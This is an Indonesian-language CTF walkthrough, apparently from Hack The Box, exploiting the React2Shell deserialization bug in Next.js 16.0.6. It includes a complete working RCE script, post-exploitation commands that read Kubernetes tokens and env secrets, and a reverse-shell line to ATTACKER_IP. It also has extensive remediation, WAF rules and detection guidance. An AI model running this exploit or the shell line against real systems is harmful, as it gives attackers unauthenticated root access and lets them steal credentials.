# Dokumentasi Lengkap — Analisis & Eksploitasi "NexusAI"
### Target: `http://154.57.164.82:34824` — CVE-2025-55182 / CVE-2025-66478 ("React2Shell")

> **Tingkat:** Pemula → Menengah
> **Tujuan:** Dokumentasi langkah-demi-langkah: dari recon, fingerprint, paham akar masalah, exploit, ambil flag, sampai remediation.
> **Peringatan etika:** Semua perintah di sini dijalankan pada lab/CTF yang diizinkan. Menjalankan ini pada sistem tanpa izin tertulis = tindak pidana (UU ITE Pasal 30 / CFAA). Gunakan hanya di lingkungan latihan.

---

## 0. TL;DR (Ringkasan 30 detik)

| Item | Nilai |
|---|---|
| **Flag** | `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}` |
| **Aplikasi** | Next.js 16.0.6 (App Router + Turbopack), React 19, Node.js 20.19.6 |
| **Kerentanan** | CVE-2025-55182 (React) / CVE-2025-66478 (Next.js) — *React2Shell* |
| **Jenis** | Unsafe Deserialization (CWE-502) → **Pre-Auth RCE** |
| **CVSS** | 10.0 Critical |
| **Dampak** | Eksekusi kode sebagai `root` di dalam container |
| **Perbaikan** | Upgrade `next` ke **16.0.7** (atau lini patch yang sesuai) |
| **Waktu eksploitasi** | ± 5 detik, 1 request HTTP |

**Inti cerita:** halaman "NexusAI" yang terlihat cantik itu **cuma kedok**. Semua tombol mati, tidak ada API, tidak ada form. Yang benar-benar bisa diserang adalah **endpoint RSC (React Server Components)** di `/` — setiap request POST dengan header `Next-Action` akan **membaca payload biner "Flight" dari user** dan melakukan deserialisasi tanpa validasi. Di versi 16.0.6 validasi itu bolong → RCE.

---

## 1. Prasyarat & Tools

### 1.1 Yang perlu disiapkan

| Kebutuhan | Keterangan |
|---|---|
| OS | Linux (Kali/Ubuntu) — di dokumen ini dipakai Kali |
| Python | ≥ 3.9 |
| Library Python | `requests` |
| Tools CLI | `curl`, `python3`, `ffuf` / `feroxbuster` (opsional) |
| Akses jaringan | Bisa menjangkau `154.57.164.82:34824` |

### 1.2 Instalasi

```bash
# Library Python yang dipakai untuk exploit
pip install requests

# (Opsional) tools enumerasi direktori
sudo apt install -y curl ffuf feroxbuster

# Buat folder kerja
mkdir -p ~/nexus-lab && cd ~/nexus-lab
```

### 1.3 Variabel kerja (biar tidak salah ketik terus)

```bash
export TARGET="http://154.57.164.82:34824"
echo $TARGET
```

---

## 2. FASE 1 — Recon Awal (melihat permukaan)

Tujuannya: pahami apa yang dikirim server, tanpa menebak-nebak.

### 2.1 Cek header HTTP

```bash
curl -s -i "$TARGET/" | head -40
```

Yang perlu diperhatikan dari output:

```
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 300
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, stale-while-revalidate
```

**Cara membacanya (penting untuk pemula):**

| Header | Arti |
|---|---|
| `X-Powered-By: Next.js` | framework = Next.js |
| `Vary: RSC, Next-Router-State-Tree, ...` | server **sadar** akan protokol RSC/Flight → ada jalur deserialisasi |
| `x-nextjs-prerender: 1` | halaman di-prerender (statis) → wajar kalau tidak ada API |
| `x-nextjs-cache: HIT` | ada cache di depan |

➡️ **Kesimpulan awal:** ini Next.js App Router. Halaman statis. Tapi header `Vary: RSC` adalah petunjuk besar.

### 2.2 Lihat HTML mentah & simpan

```bash
curl -s "$TARGET/" -o index.html
wc -c index.html          # ~22.725 byte
```

Cari elemen menarik:

```bash
grep -oE '<title>[^<]*</title>' index.html
grep -oE 'href="[^"]*"' index.html | sort -u
grep -oE 'src="[^"]*"'  index.html | sort -u
```

Hasil: hanya anchor `#features`, beberapa chunk JS Next.js, tidak ada form, tidak ada link internal.

### 2.3 Ambil teks yang terlihat (seperti yang dilihat user)

```bash
python3 - <<'PY'
import re,html
s=open('index.html',encoding='utf-8').read()
body=s.split('<body',1)[1]
txt=re.sub(r'<script.*?</script>','',body,flags=re.S)
txt=re.sub(r'<[^>]+>','\n',txt)
txt=html.unescape(txt)
lines=[l.strip() for l in txt.splitlines() if l.strip()]
print("\n".join(lines[:60]))
PY
```

Hasil: hanya copywriting marketing ("Your Personal AI Assistant", "Start Free Trial", "Watch Demo", dst). **Tidak ada flag, tidak ada kredensial.**

### 2.4 Cek file "standar" yang biasanya ada

```bash
for p in robots.txt sitemap.xml manifest.json .well-known/security.txt \
         favicon.ico package.json .env next.config.js; do
  printf "%-32s " "/$p"
  curl -s -o /dev/null -m 6 -w "%{http_code} %{size_download}\n" "$TARGET/$p"
done
```

Hasil semua `404 7746` — dan **7746 byte itu ukuran halaman 404 Next.js**, artinya tidak ada file nyasar.

> 💡 **Pelajaran:** ukuran response yang konsisten = penanda halaman error. Selalu catat ukuran baseline 404 agar tidak "false positive" saat fuzzing.

---

## 3. FASE 2 — Enumerasi (membuktikan bahwa "tidak ada apa-apa")

Ini fase yang membosankan tapi wajib. Kalau kita tidak membuktikan, kita akan terus menebak.

### 3.1 Brute-force direktori

```bash
ffuf -u "$TARGET/FUZZ" \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
     -mc all -fc 404 -t 80 -s
```

Atau dengan feroxbuster:

```bash
feroxbuster -u "$TARGET" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 60 --status-codes 200,201,204,301,302,307,401,403,405,500 \
  -d 1 --exclude-length 7746,9 -o ferox.txt
```

### 3.2 Uji path "pintu belakang" manual

```bash
for p in admin login api api/chat api/v1/chat dashboard chat app panel \
         internal debug console flag flag.txt secret .env backup v2 v1 \
         graphql trpc swagger docs health status metrics; do
  code=$(curl -s -o /dev/null -m 5 -w "%{http_code}" "$TARGET/$p")
  [ "$code" != "404" ] && echo "$code /$p"
done
```

**Hasil: kosong.** Semua 404.

### 3.3 Uji refleksi parameter (XSS/reflection)

```bash
curl -s "$TARGET/" -o base.html
md5sum base.html

for p in q query search name user message msg text input prompt chat id \
         page debug admin token redirect url next template cmd exec; do
  h=$(curl -s "$TARGET/?$p=zzqmark123" | md5sum | cut -d' ' -f1)
  b=$(md5sum base.html | cut -d' ' -f1)
  [ "$h" != "$b" ] && echo "DIFF -> ?$p"
done
echo "selesai"
```

**Hasil: tidak ada satu pun parameter yang mengubah response.** → tidak ada XSS refleksi, tidak ada SSTI, tidak ada parameter dinamis di permukaan.

### 3.4 Uji refleksi header

```bash
for h in "User-Agent: zzqUA" "Referer: http://zzq/" \
         "Cookie: a=zzq" "X-Forwarded-For: zzq"; do
  n=$(curl -s -H "$h" "$TARGET/" | grep -c zzq)
  echo "$h -> $n"
done
```

**Hasil: 0.** Header tidak direfleksikan.

### 3.5 Cek port lain di host

```bash
python3 - <<'PY'
import socket
from concurrent.futures import ThreadPoolExecutor
host="154.57.164.82"
ports=list(range(1,1025))+[1337,3000,3001,5000,8000,8080,8443,9000,34824]
def chk(p):
    s=socket.socket(); s.settimeout(1.2)
    try:
        s.connect((host,p)); return p
    except: return None
    finally: s.close()
with ThreadPoolExecutor(200) as ex:
    print("OPEN:",[p for p in ex.map(chk,ports) if p])
PY
```

**Hasil: hanya `34824` yang terbuka.** (Catatan: `PORT=1337` kita temukan nanti dari dalam container — itu port internal, tidak diekspos.)

### 3.6 Kesimpulan Fase 2

> Permukaan serangan **nol** dari sisi UI/URL. Tidak ada endpoint tambahan.
> Maka satu-satunya jalur yang tersisa adalah **protokol yang dipakai halaman itu sendiri**: RSC/Flight pada `POST /`.

Inilah "gangguan samar" yang dimaksud di deskripsi tantangan — bukan teks tersembunyi di layar, tapi **fitur framework** yang tidak terlihat oleh user biasa.

---

## 4. FASE 3 — Fingerprinting Versi (kunci seluruh kasus ini)

CVE ini **spesifik versi**. Jadi langkah paling menentukan adalah memastikan versinya.

### 4.1 Ciri Next.js 16 (Turbopack)

```bash
grep -oE '/_next/static/chunks/[a-z0-9-]+\.js' index.html | sort -u
```

Kalau muncul file seperti:

```
/_next/static/chunks/turbopack-9e886ff5105ab694.js
```

→ itu **penanda Next.js 16.x** (Turbopack jadi default; Next 15 masih `webpack-*.js`).

### 4.2 Ambil daftar chunk & cari versi di dalamnya

```bash
mkdir -p chunks && cd chunks
grep -oE '/_next/static/chunks/[A-Za-z0-9._-]+\.js' ../index.html | sort -u | \
  while read u; do curl -s "$TARGET$u" -O; done
ls -la

grep -aoE '16\.[0-9]+\.[0-9]+' *.js | sort -u | head
```

### 4.3 Verifikasi final (setelah RCE)

```bash
python3 rce.py 'cat /app/package.json'
```

```json
"dependencies": { "next": "16.0.6", "react": "^19", "react-dom": "^19" }
```

### 4.4 Tabel versi rentan (referensi cepat)

| Lini | Rentan | Aman |
|---|---|---|
| Next.js 16.0.x | **16.0.0 – 16.0.6** | 16.0.7 |
| Next.js 15.5.x | 15.5.0 – 15.5.6 | 15.5.7 |
| Next.js 15.4.x | 15.4.0 – 15.4.7 | 15.4.8 |
| Next.js 15.3.x | 15.3.0 – 15.3.5 | 15.3.6 |
| Next.js 15.2.x | 15.2.0 – 15.2.5 | 15.2.6 |
| Next.js 15.1.x | 15.1.0 – 15.1.8 | 15.1.9 |
| Next.js 15.0.x | 15.0.0 – 15.0.4 | 15.0.5 |
| React (RSC) | 19.0.0 / 19.1.0–19.1.1 / 19.2.0 | 19.0.1 / 19.1.2 / 19.2.1 |

> `16.0.6` ada **tepat di ujung rentan**. Itulah sebabnya box ini bisa dipecah.

---

## 5. FASE 4 — Paham Dulu: Apa itu RSC & "Flight Protocol"?

Bagian ini yang bikin paham, bukan sekadar copy-paste.

### 5.1 Analogi sederhana

Bayangkan restoran:

- **Cara lama (SSR biasa):** pelayan membawakan **makanan jadi** (HTML) ke meja. Kamu tidak bisa menyuruh koki.
- **Cara RSC:** pelayan membawakan **instruksi masak** (payload Flight) + kamu boleh **mengirim instruksi balik** ke dapur (Server Action). Dapurnya lalu **membaca dan menjalankan instruksi itu**.

Nah, CVE ini: dapur menerima instruksi dari pelanggan **tanpa memeriksa apakah instruksinya wajar**. Pelanggan bisa menulis instruksi "buang semua isi brankas ke meja".

### 5.2 Bentuk teknisnya

Saat halaman Next.js App Router dibuka, browser mengirim request dengan header khusus:

```http
GET / HTTP/1.1
RSC: 1
Next-Router-State-Tree: [...]
```

Server membalas dengan **stream teks** berformat Flight, contohnya (yang kita ekstrak dari HTML):

```
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:{"title":"NexusAI - Personal AI Assistants",...}
```

Arti notasi:

| Notasi | Arti |
|---|---|
| `$@1` | referensi ke chunk nomor 1 |
| `$B1337` | referensi ke **Blob** |
| `$Q2` | referensi ke Map/array |
| `$1:__proto__:then` | **akses properti lewat rantai prototipe** ← ini biang keroknya |

### 5.3 Kenapa berbahaya

Di library `react-server-dom-*` (webpack/turbopack/parcel), saat memproses `$1:__proto__:then`, kode melakukan sesuatu seperti:

```js
let value = moduleExports;
for (const key of path) value = value[key];   // ← bracket notation
return value;
```

Karena memakai **bracket notation tanpa whitelist**, penyerang bisa berjalan menembus prototipe:

```
objek → __proto__ → constructor → constructor → Function
```

`Function` adalah konstruktor JS. `Function("kode")` = **menjalankan kode apa pun**. Boom.

---

## 6. FASE 5 — Anatomi CVE-2025-55182 / CVE-2025-66478

### 6.1 Ringkasan teknis

| Aspek | Detail |
|---|---|
| **CWE** | CWE-502 Deserialization of Untrusted Data |
| **Komponen** | `react-server-dom-webpack` / `-turbopack` / `-parcel` (React 19), dipakai Next.js App Router |
| **Trigger** | `POST /` + header `Next-Action: x` + body `multipart/form-data` |
| **Syarat** | Hanya butuh route App Router apa pun. **Tidak perlu** Server Action valid, **tidak perlu** login |
| **Efek** | Eksekusi JS arbitrer di server Node.js |

### 6.2 Rantai serangan (5 langkah)

```
[1] POST / dengan 3 field multipart  ─────────────►  server
        │
[2] Field "1" = "$@0"  →  server mengambil chunk 0 sebagai objek
        │
[3] Chunk 0 punya  then = "$1:__proto__:then"
        →  server memakai Chunk.prototype.then sebagai "then" milik objek kita
        │
[4] Saat objek itu di-await, then() dipanggil → masuk initializeModelChunk()
        dengan chunk palsu yang seluruh isinya kita kontrol
        │
[5] Jalur deserialisasi Blob memanggil:  response._formData.get(response._prefix)
        _formData.get  = "$1:constructor:constructor"  =  Function
        _prefix        = kode JS kita
        →  Function("kode kita")()  →  RCE
```

### 6.3 Kenapa output-nya bisa kita baca

Response normal adalah 500 (error). Tapi kalau kita **lempar error yang mengandung hasil command** di properti `digest`, Next.js akan **menyiarkan digest itu ke client** (fitur untuk debugging error server action). Jadi:

```js
throw Object.assign(new Error('NEXT_REDIRECT'), { digest: hasil_command })
```

→ hasil `execSync` muncul di body response. Ini teknik exfiltrasi yang elegan: **tidak butuh reverse shell, tidak butuh outbound internet**.

---

## 7. FASE 6 — Menulis Exploit (kode + penjelasan baris per baris)

### 7.1 Script lengkap: `rce.py`

```python
#!/usr/bin/env python3
"""
CVE-2025-55182 / CVE-2025-66478 (React2Shell)
Client RCE untuk Next.js 16.0.0-16.0.6 / React 19 (RSC).
Penggunaan:  python3 rce.py '<perintah shell>'
"""
import sys, json, uuid, requests

TARGET = "http://154.57.164.82:34824/"

def run(cmd, target=TARGET):
    # --- 1. boundary multipart acak ---
    b = "----WebKitFormBoundary" + uuid.uuid4().hex

    # --- 2. kode JS yang akan dieksekusi di server ---
    #     hasil command dimasukkan ke error.digest agar terkirim balik ke client
    js = ("var res=process.mainModule.require('child_process')"
          ".execSync(%s,{timeout:10000}).toString();"
          "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});" % json.dumps(cmd))

    # --- 3. "fake chunk": objek yang meniru struktur internal React ---
    chunk = {
        "then": "$1:__proto__:then",       # pakai Chunk.prototype.then (bukan milik kita)
        "status": "resolved_model",        # paksa React masuk initializeModelChunk()
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",  # memicu jalur deserialisasi Blob
        "_response": {
            "_prefix": js,                                  # kode yang dijalankan
            "_chunks": "$Q2",                               # Map kosong
            "_formData": {"get": "$1:constructor:constructor"},  # get = Function
        },
    }

    # --- 4. susun body multipart 3 field ---
    parts = []
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="0"\r\n\r\n{json.dumps(chunk)}\r\n')
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n')
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n')
    parts.append(f'--{b}--\r\n')
    body = "".join(parts).encode()

    headers = {
        "Next-Action": "x",                                  # trigger pemrosesan RSC
        "Content-Type": f"multipart/form-data; boundary={b}",
        "User-Agent": "Mozilla/5.0",
    }

    r = requests.post(target, data=body, headers=headers, timeout=30)
    return r.status_code, r.text

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    code, text = run(cmd)
    print("status:", code)
    print(text[:4000])
```

### 7.2 Penjelasan tiap bagian

| Baris / bagian | Fungsi | Kenapa penting |
|---|---|---|
| `uuid4().hex` | boundary acak | menghindari tabrakan & filter WAF sederhana |
| `process.mainModule.require('child_process')` | mengambil modul Node | jalur klasik untuk eksekusi perintah di Node |
| `execSync(cmd)` | jalankan perintah shell | sinkron → hasil langsung tersedia |
| `throw Object.assign(new Error('NEXT_REDIRECT'), {digest:res})` | exfiltrasi | Next.js menyiarkan `digest` ke client |
| `"then": "$1:__proto__:then"` | prototype chain traversal | inti kerentanan |
| `"status": "resolved_model"` | state manipulation | memaksa React memproses chunk kita |
| `"$B1337"` | Blob reference | memicu `_formData.get(...)` |
| `"_formData": {"get": "$1:constructor:constructor"}` | ganti `get` dengan `Function` | "pintu" menuju eksekusi kode |
| `"Next-Action": "x"` | header pemicu | nilai apa pun diterima |
| field `"1"` = `"$@0"` | referensi chunk 0 | membuat server me-resolve objek kita |
| field `"2"` = `[]` | data pendukung | melengkapi struktur Flight |

### 7.3 Alternatif: pakai `curl` (tanpa Python)

Simpan sebagai `payload.txt`, lalu:

```bash
curl -s -X POST "$TARGET/" \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=----X" \
  --data-binary @payload.txt
```

> Untuk pemula **sangat disarankan pakai `rce.py`** — `curl` rawan salah soal `\r\n`.

---

## 8. FASE 7 — Eksekusi (step by step)

### Langkah 1 — Uji hidup: `id`

```bash
cd ~/nexus-lab
python3 rce.py id
```

Output:

```
status: 500
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n"}
```

✅ **Berhasil.** Kita `root`. Status 500 itu **normal** — kita memang melempar error.

### Langkah 2 — Kenali lingkungan

```bash
python3 rce.py 'ls -la /'
```

```bash
python3 rce.py 'env | sort'
```

Temuan penting:

| Variabel | Nilai | Arti |
|---|---|---|
| `PORT` | `1337` | port internal app |
| `PWD` | `/app/.next/standalone` | build output mode standalone |
| `NODE_ENV` | `production` | bukan dev mode |
| `NODE_VERSION` | `20.19.6` | runtime |
| `KUBERNETES_SERVICE_HOST` | `10.96.0.1` | berjalan di **Kubernetes** |
| `TURBOPACK` | `1` | dikonfirmasi pakai Turbopack |

### Langkah 3 — Cari flag

```bash
python3 rce.py 'ls -la /app'
```

```
-rw------- 1 root root   98 Dec  5 2025 flag.txt
-rw------- 1 root root  117 Dec  5 2025 next.config.mjs
drwxr-xr-x 1 root root 12288 Dec  5 2025 node_modules
-rw-r--r-- 1 root root 227617 Dec  5 2025 package-lock.json
-rw------- 1 root root  558 Dec  5 2025 package.json
```

Perhatikan permission `-rw-------` (600, root only). **Tanpa RCE root, file ini mustahil dibaca** — bahkan via path traversal sekalipun.

### Langkah 4 — Baca flag

```bash
python3 rce.py 'cat /app/flag.txt'
```

```
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

🎉 **Selesai.**

### Langkah 5 (opsional) — Konfirmasi versi & konteks

```bash
python3 rce.py 'cat /app/package.json; node -v'
```

---

## 9. FASE 8 — Post-Exploitation (yang bisa dilakukan penyerang nyata)

Ini bagian yang menjelaskan **dampak sebenarnya**, bukan cuma "dapat flag".

```bash
# 1. Kredensial / secret di environment
python3 rce.py 'env'

# 2. Kredensial Kubernetes (jika service account ter-mount)
python3 rce.py 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 200'

# 3. File konfigurasi & secret aplikasi
python3 rce.py 'find /app -maxdepth 2 -name "*.env*" -o -name "*secret*" -o -name "*.pem" 2>/dev/null'

# 4. Reverse shell (butuh koneksi keluar)
python3 rce.py 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Dampak nyata di produksi:**

| Kemampuan | Konsekuensi |
|---|---|
| Baca semua file | source code, `.env`, private key, dump DB |
| Baca env | API key pihak ketiga, kredensial DB, token cloud |
| Baca token K8s | eskalasi ke Kubernetes API (jika RBAC longgar) |
| Eksekusi perintah | pivot ke jaringan internal, cryptominer, ransomware |
| Persistensi | tulis cron/systemd, backdoor di `node_modules` |

> Di box ini kita berhenti di flag (sesuai aturan CTF). Poin pentingnya: **satu request = root**.

---

## 10. REMEDIATION (Perbaikan) — Bagian Paling Penting

### 10.1 Perbaikan utama: PATCH VERSI

**Tidak ada workaround konfigurasi.** Wajib upgrade.

```bash
# --- Next.js 16.0.x ---
npm install next@16.0.7

# --- lini lain ---
npm install next@15.5.7   # 15.5.x
npm install next@15.4.8   # 15.4.x
npm install next@15.3.6   # 15.3.x
npm install next@15.2.6   # 15.2.x
npm install next@15.1.9   # 15.1.x
npm install next@15.0.5   # 15.0.x
```

Cek versi terpasang:

```bash
npm ls next react-server-dom-webpack react-server-dom-turbopack react-server-dom-parcel
```

Verifikasi di lockfile (harus tidak ada versi rentan):

```bash
grep -A2 '"node_modules/next"' package-lock.json | head
```

**Tool otomatis dari Vercel:**

```bash
# cek saja (dry run)
npx fix-react2shell-next --dry-run

# perbaiki otomatis
npx fix-react2shell-next --fix

# mode JSON (untuk CI)
npx fix-react2shell-next --json
```

### 10.2 Patch React (jika pakai RSC di luar Next.js)

```bash
npm install react@19.2.1 react-dom@19.2.1
# atau sesuai lini: 19.0.1 / 19.1.2 / 19.2.1
npm install react-server-dom-webpack@19.2.1
```

### 10.3 Rebuild & redeploy (JANGAN LUPA)

```bash
rm -rf .next node_modules/.cache
npm ci
npm run build
npm run start
```

> ⚠️ **Kesalahan umum:** sudah `npm install` tapi container masih pakai image lama. Pastikan image di-rebuild dan digest-nya berubah.

### 10.4 Hardening container (defense in depth)

Karena app jalan sebagai **root**, dampak CVE ini maksimal. Perbaiki:

**Dockerfile:**

```dockerfile
FROM node:20-alpine
WORKDIR /app

# buat user non-root
RUN addgroup -S app && adduser -S app -G app

COPY --chown=app:app . .
RUN npm ci --omit=dev && npm run build

USER app
EXPOSE 1337
CMD ["node", "server.js"]
```

**docker-compose.yml:**

```yaml
services:
  web:
    build: .
    user: "1000:1000"
    read_only: true
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    mem_limit: 512m
    pids_limit: 200
```

**Kubernetes (PodSecurity):**

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
  seccompProfile:
    type: RuntimeDefault
```

### 10.5 Jangan ekspos Node.js langsung ke internet

```yaml
# Gunakan reverse proxy + rate limit
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    nginx.ingress.kubernetes.io/limit-rps: "10"
```

Dan **blokir** request mencurigakan di edge (lihat 10.6).

### 10.6 WAF / aturan deteksi-blocking

Aturan sederhana yang efektif memblokir PoC publik:

```nginx
# nginx — blokir POST dengan Next-Action tanpa cookie sesi valid (contoh)
map $http_next_action $block_action {
    default               0;
    "~."                  1;
}

server {
    if ($block_action = 1) {
        return 403;
    }
}
```

Lebih presisi — blokir pola payload:

```nginx
# tolak body yang memuat penanda prototype-chain traversal
if ($request_body ~* "__proto__") { return 403; }
if ($request_body ~* "_formData")  { return 403; }
if ($request_body ~* "constructor:constructor") { return 403; }
```

**ModSecurity / CRS:**

```
SecRule REQUEST_HEADERS:Next-Action "@rx ." \
  "id:1001,phase:1,deny,status:403,msg:'RSC action blocked'"
SecRule REQUEST_BODY "@rx (__proto__|_formData|constructor:constructor)" \
  "id:1002,phase:2,deny,status:403,msg:'React2Shell payload'"
```

> ⚠️ WAF hanya **mitigasi sementara**. Tetap wajib patch.

### 10.7 Least privilege

| Item | Sebelum | Sesudah |
|---|---|---|
| User container | `root` | `app` (UID 1000) |
| Filesystem | writable | `readOnlyRootFilesystem` |
| Capabilities | default (banyak) | `drop: ALL` |
| Service account | token ter-mount | `automountServiceAccountToken: false` |
| Network egress | bebas | dibatasi (egress policy) |

```yaml
automountServiceAccountToken: false
```

### 10.8 Checklist remediation (print & tempel)

- [ ] `next` ≥ 16.0.7 (atau lini patch sesuai)
- [ ] `react-server-dom-*` ≥ 19.2.1
- [ ] Image di-rebuild & digest berubah
- [ ] Container jalan sebagai non-root
- [ ] `readOnlyRootFilesystem: true`
- [ ] `capabilities: drop ALL`
- [ ] `allowPrivilegeEscalation: false`
- [ ] Service account token tidak ter-mount
- [ ] WAF memblokir `Next-Action` + pola `__proto__`
- [ ] Egress dibatasi
- [ ] Alert untuk POST anomali ke route App Router
- [ ] Scan dependensi otomatis di CI (`npm audit`, Dependabot)

---

## 11. DETEKSI (untuk Blue Team) — IOC & Log

### 11.1 Tanda serangan di access log

Cari request dengan pola:

```
POST / HTTP/1.1
Next-Action: <apa saja>
Content-Type: multipart/form-data
```

Query deteksi (nginx/JSON log):

```bash
grep -i '"POST /' access.log | grep -i 'next-action'
```

Atau dengan `jq` bila log JSON:

```bash
jq -r 'select(.method=="POST" and (.headers["next-action"] != null)) |
       [.time, .remote_addr, .uri, .status] | @tsv' access.log
```

### 11.2 Indikator payload

| Indikator | Arti |
|---|---|
| Body mengandung `__proto__` | prototype chain traversal |
| Body mengandung `_formData` | injeksi objek `_response` |
| Body mengandung `constructor:constructor` | upaya akses `Function` |
| Body mengandung `$B` / `$@` | referensi chunk Flight palsu |
| `Next-Action` bernilai acak (`x`, `1`, dll.) | bukan action ID valid (formatnya hash 40+ char) |

**Contoh aturan Sigma (kasar):**

```yaml
title: React2Shell (CVE-2025-55182) Exploitation Attempt
detection:
  headers:
    Next-Action: '*'
  body:
    - '__proto__'
    - '_formData'
  condition: headers and body
level: critical
```

### 11.3 Tanda post-exploitation

```bash
# proses anak mencurigakan dari node
ps aux | grep -E 'node.*(sh|bash|curl|wget|nc)'

# file baru di direktori app
find /app -newermt '-1 hour' -type f

# koneksi keluar dari container
ss -tp | grep node
```

### 11.4 Verifikasi cepat apakah sistem masih rentan

```bash
# kirim payload benign (hanya `echo`), lihat apakah terpantul
python3 rce.py 'echo VULN_CHECK_123'
# jika "VULN_CHECK_123" muncul di response → MASIH RENTAN
```

---

## 12. PELAJARAN (Takeaways)

1. **"Tidak ada endpoint" ≠ "tidak ada serangan".** Protokol framework itu sendiri adalah endpoint. `POST /` + `Next-Action` sudah cukup.
2. **Versi adalah segalanya.** `16.0.6` vs `16.0.7` = beda antara "aman" dan "root".
3. **UI adalah lapisan kosmetik.** Halaman marketing statis bisa menutupi RCE kelas 10.0.
4. **Enumerasi yang "gagal" tetap berharga.** Membuktikan tidak ada `/admin`, tidak ada XSS, tidak ada refleksi → mempersempit ke satu hipotesis.
5. **Header `Vary: RSC` adalah petunjuk.** Kalau melihat itu, langsung pikirkan Flight protocol.
6. **Root di container = dampak maksimal.** Satu bug deserialisasi jadi kompromi total.
7. **Patch saja tidak cukup.** Butuh least privilege + WAF + monitoring.

### Peta jalan berpikir (untuk kasus serupa)

```
1. Lihat header        → framework apa?
2. Lihat versi         → ada CVE dikenal?
3. Enumerasi path      → ada permukaan lain?
4. Uji refleksi input  → ada XSS/SSTI?
5. Tidak ada apa-apa?  → fokus ke PROTOKOL (RSC, GraphQL, gRPC, WebSocket)
6. Cocokkan versi ke CVE → susun PoC
7. Eksekusi minimal (id) → baru eksploitasi penuh
```

---

## 13. Referensi

| Sumber | URL |
|---|---|
| Advisory resmi Next.js | https://nextjs.org/blog/CVE-2025-66478 |
| Panduan backport & tabel versi | https://github.com/vercel/next.js/issues/86790 |
| Tool fix otomatis Vercel | https://github.com/vercel-labs/fix-react2shell-next |
| PoC ringkas (maple3142) | https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3 |
| PoC + WAF bypass | https://github.com/jedisct1/react2shell-exploit |
| NVD CVE-2025-55182 | https://nvd.nist.gov/vuln/detail/CVE-2025-55182 |
| NVD CVE-2025-66478 | https://nvd.nist.gov/vuln/detail/CVE-2025-66478 |

---

## 14. Lampiran — Cheat Sheet

```bash
# ===== RECON =====
curl -s -i "$TARGET/" | head -40                  # header
curl -s "$TARGET/" -o index.html                  # simpan HTML
grep -oE '/_next/static/chunks/[^"]+' index.html  # daftar chunk
ffuf -u "$TARGET/FUZZ" -w wordlist.txt -fc 404 -s # brute path

# ===== FINGERPRINT =====
grep -aoE '16\.[0-9]+\.[0-9]+' chunks/*.js | sort -u

# ===== EXPLOIT =====
python3 rce.py id                                 # uji hidup
python3 rce.py 'ls -la /app'                      # lihat file
python3 rce.py 'cat /app/flag.txt'                # ambil flag
python3 rce.py 'env | sort'                       # baca env

# ===== REMEDIASI =====
npm install next@16.0.7
npx fix-react2shell-next --fix
npm ci && npm run build

# ===== VERIFIKASI =====
python3 rce.py 'echo STILL_VULNERABLE'            # harus TIDAK muncul
```

---

**Dokumen ini dibuat untuk pembelajaran di lingkungan lab/CTF yang sah.**
**Status akhir: SOLVED — flag diperoleh, akar masalah teridentifikasi, remediasi terdokumentasi.**
